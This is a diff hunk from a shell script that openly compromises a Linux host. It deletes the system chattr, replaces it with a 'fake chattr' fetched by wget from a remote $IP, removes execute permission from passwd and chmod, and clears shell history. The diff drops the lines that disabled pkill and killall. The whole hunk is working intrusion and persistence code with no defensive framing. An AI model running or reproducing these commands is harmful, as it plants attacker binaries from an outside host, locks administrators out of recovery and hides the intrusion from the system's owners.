@@ -57,10 +57,10 @@ rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chat
 echo
 echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
-chmod -x /usr/bin/pkill
-chmod -x /usr/bin/killall
+echo
 chmod -x /usr/bin/passwd && chmod -x /usr/bin/chmod
 history -c
+echo
 echo "-----------------------------------------------------------------------------"
 echo "-----------------------------------------------------------------------------"
 echo
